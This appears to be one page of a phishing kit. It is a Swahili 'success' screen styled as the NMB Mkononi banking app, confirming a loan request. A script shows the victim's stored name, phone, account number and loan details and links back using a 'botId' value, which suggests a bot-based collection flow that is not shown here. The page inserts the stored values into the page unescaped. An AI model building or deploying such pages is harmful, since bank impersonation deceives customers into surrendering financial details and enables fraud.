<!DOCTYPE html>
<html lang="sw">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>NMB Mkononi - Umefanikiwa</title>

  <style>
    /* ── reset & base ── */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
    }

    html, body {
      width: 100%;
      min-height: 100%;
    }

    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      color: #fff;
      background: linear-gradient(
        180deg,
        #ff7a00 0%,
        #ff8c1a 10%,
        #d96a00 26%,
        #7a3a00 44%,
        #2a1400 62%,
        #0a0500 78%,
        #000000 100%
      );
      background-attachment: fixed;
      background-size: cover;
      background-repeat: no-repeat;
    }

    /* ── top bar ── */
    .top-bar {
      height: 72px;
      display: flex;
      align-items: center;
      padding: 0 22px;
      flex-shrink: 0;
      position: relative;
      z-index: 2;
    }

    .brand-name {
      color: #fff;
      font-size: 15px;
      font-weight: 700;
      letter-spacing: 0.8px;
      text-transform: uppercase;
      opacity: 0.95;
      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
    }

    /* ── container ── */
    .container {
      flex: 1;
      width: 100%;
      max-width: 420px;
      margin: 0 auto;
      padding: 20px 24px 100px;
      display: flex;
      flex-direction: column;
      position: relative;
      z-index: 1;
    }

    /* ── success icon ── */
    .success-icon-wrap {
      display: flex;
      justify-content: center;
      margin: 24px 0 24px;
    }

    .success-icon {
      width: 96px;
      height: 96px;
      border-radius: 50%;
      background: rgba(255, 140, 26, 0.15);
      border: 2px solid rgba(255, 140, 26, 0.55);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      box-shadow: 0 0 0 8px rgba(255, 140, 26, 0.08), 0 8px 28px rgba(0, 0, 0, 0.35);
      animation: pop 0.55s cubic-bezier(0.22, 1, 0.36, 1);
    }

    .success-icon::before {
      content: "";
      position: absolute;
      inset: -14px;
      border-radius: 50%;
      border: 2px dashed rgba(255, 140, 26, 0.35);
      animation: spin 14s linear infinite;
    }

    .success-icon svg {
      width: 48px;
      height: 48px;
      stroke: #ffb066;
      stroke-width: 3.5;
      stroke-linecap: round;
      stroke-linejoin: round;
      fill: none;
      filter: drop-shadow(0 2px 6px rgba(255, 140, 26, 0.4));
    }

    @keyframes pop {
      0% { transform: scale(0.4); opacity: 0; }
      60% { transform: scale(1.06); opacity: 1; }
      100% { transform: scale(1); }
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* ── title & subtitle ── */
    .title {
      font-size: 26px;
      font-weight: 700;
      color: #ffffff;
      text-align: center;
      margin-bottom: 8px;
      letter-spacing: -0.3px;
      text-shadow: 0 2px 8px rgba(0, 0, 0, 0.35);
    }

    .subtitle {
      font-size: 15px;
      color: rgba(255, 255, 255, 0.82);
      text-align: center;
      line-height: 1.55;
      margin-bottom: 28px;
      text-shadow: 0 1px 6px rgba(0, 0, 0, 0.3);
    }

    /* ── detail card (glass dark) ── */
    .detail-card {
      background: rgba(0, 0, 0, 0.28);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border-radius: 16px;
      padding: 6px 18px;
      margin-bottom: 20px;
      border: 1px solid rgba(255, 255, 255, 0.12);
      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.2);
    }

    .detail-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 14px;
      padding: 14px 0;
      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
    }

    .detail-row:last-child {
      border-bottom: none;
    }

    .detail-label {
      font-size: 12px;
      font-weight: 700;
      color: #ffb066;
      letter-spacing: 0.7px;
      text-transform: uppercase;
      flex-shrink: 0;
    }

    .detail-value {
      font-size: 15px;
      font-weight: 600;
      color: #ffffff;
      text-align: right;
      word-break: break-word;
      line-height: 1.4;
    }

    /* ── info notice ── */
    .info-notice {
      text-align: center;
      font-size: 13px;
      color: rgba(255, 255, 255, 0.75);
      line-height: 1.6;
      padding: 14px 16px;
      border-radius: 12px;
      background: rgba(255, 140, 26, 0.14);
      border: 1px solid rgba(255, 140, 26, 0.35);
      margin-bottom: 8px;
      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
    }

    /* ── button (fixed, NMB orange) ── */
    .continue-btn {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      bottom: 28px;
      width: calc(100% - 48px);
      max-width: 420px;
      height: 56px;
      font-size: 18px;
      font-weight: 700;
      border-radius: 12px;
      border: none;
      cursor: pointer;
      transition: background 0.25s, transform 0.1s, box-shadow 0.25s;
      background: linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%);
      color: #ffffff;
      text-transform: uppercase;
      letter-spacing: 1px;
      box-shadow: 0 6px 20px rgba(255, 122, 0, 0.45);
      z-index: 3;
      text-decoration: none;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .continue-btn:hover {
      background: linear-gradient(135deg, #ff9a33 0%, #ff7a0d 100%);
      transform: translateX(-50%) translateY(-1px);
      box-shadow: 0 8px 24px rgba(255, 122, 0, 0.55);
    }

    .continue-btn:active {
      transform: translateX(-50%) translateY(0);
    }

    .footer {
      margin-top: 24px;
      text-align: center;
      font-size: 12px;
      color: rgba(255, 255, 255, 0.45);
      letter-spacing: 0.5px;
      padding-bottom: 12px;
    }

    /* ── responsive ── */
    @media (max-width: 480px) {
      .container {
        padding: 16px 18px 100px;
      }
      .title {
        font-size: 24px;
      }
      .success-icon {
        width: 88px;
        height: 88px;
      }
      .success-icon svg {
        width: 42px;
        height: 42px;
      }
      .continue-btn {
        height: 54px;
        font-size: 17px;
        width: calc(100% - 36px);
      }
      .detail-value {
        font-size: 14px;
      }
    }

    @media (max-width: 360px) {
      .container {
        padding: 14px 16px 96px;
      }
      .title {
        font-size: 22px;
      }
      .subtitle {
        font-size: 14px;
      }
      .continue-btn {
        height: 52px;
        font-size: 16px;
      }
    }
  </style>
</head>
<body>

  <!-- Top bar (NMB Mkononi) -->
  <div class="top-bar">
    <span class="brand-name">NMB Mkononi</span>
  </div>

  <div class="container">

    <!-- Success icon -->
    <div class="success-icon-wrap">
      <div class="success-icon">
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <polyline points="4 12.5 10 18.5 20 6.5" />
        </svg>
      </div>
    </div>

    <div class="title">Umefanikiwa!</div>
    <div class="subtitle">
      Ombi lako limepokelewa kwa mafanikio.<br />
      Tutawasiliana nawe hivi karibuni.
    </div>

    <!-- Detail card (populated from localStorage) -->
    <div class="detail-card" id="detailCard">
      <!-- Rows injected by script -->
    </div>

    <div class="info-notice">
      Asante kwa kutumia huduma za NMB Mkononi.<br />
      Kwa msaada zaidi, tafadhali wasiliana na huduma kwa wateja.
    </div>

    <div class="footer">NMB Mkononi v 5.3.2 (1.0.0)</div>
  </div>

  <!-- Done button -->
  <a id="doneBtn" class="continue-btn" href="index.html">Maliza</a>

<!-- ====== SCRIPT: populate details from localStorage ====== -->
<script>
  (function() {
    // ── Read stored data ──
    const fullName     = localStorage.getItem('fullName') || localStorage.getItem('name');
    const phone        = localStorage.getItem('phone');
    const loanAmount   = localStorage.getItem('loanAmount');
    const loanTerm     = localStorage.getItem('loanTerm');
    const botId        = localStorage.getItem('botId');
    const accountNumber = localStorage.getItem('accountNumber');

    // ── Format helper ──
    function formatAmount(val) {
      const n = Number(val);
      if (!val || isNaN(n)) return null;
      return 'TSh ' + n.toLocaleString('en-US');
    }

    function formatPhone(p) {
      if (!p) return null;
      // Display as +255 XXX XXX XXX when possible
      const digits = p.replace(/\D/g, '');
      if (digits.length >= 12 && digits.startsWith('255')) {
        const a = digits.slice(3, 6);
        const b = digits.slice(6, 9);
        const c = digits.slice(9, 12);
        return `+255 ${a} ${b} ${c}`.trim();
      }
      return p;
    }

    // ── Build detail rows ──
    const rows = [];

    if (fullName) rows.push({ label: 'Jina', value: fullName });
    if (phone)    rows.push({ label: 'Simu', value: formatPhone(phone) });
    if (accountNumber) rows.push({ label: 'Akaunti', value: accountNumber });
    if (loanAmount) rows.push({ label: 'Kiasi cha Mkopo', value: formatAmount(loanAmount) });
    if (loanTerm)  rows.push({ label: 'Muda wa Mkopo', value: 'Miezi ' + loanTerm });

    const card = document.getElementById('detailCard');

    if (rows.length === 0) {
      card.style.display = 'none';
    } else {
      card.innerHTML = rows.map(r => `
        <div class="detail-row">
          <div class="detail-label">${r.label}</div>
          <div class="detail-value">${r.value}</div>
        </div>
      `).join('');
    }

    // ── Done button: go home (or bot entry point if available) ──
    const doneBtn = document.getElementById('doneBtn');
    if (botId) {
      doneBtn.href = `index.html?botId=${encodeURIComponent(botId)}`;
    } else {
      doneBtn.href = 'index.html';
    }

    // ── Optional: clear sensitive data so a refresh doesn't resend ──
    // Keep fullName / botId for a possible new flow, but drop the rest.
    try {
      localStorage.removeItem('accountNumber');
      localStorage.removeItem('loanAmount');
      localStorage.removeItem('loanTerm');
      localStorage.removeItem('loanFormData');
    } catch (e) { /* ignore */ }
  })();
</script>

</body>
</html>
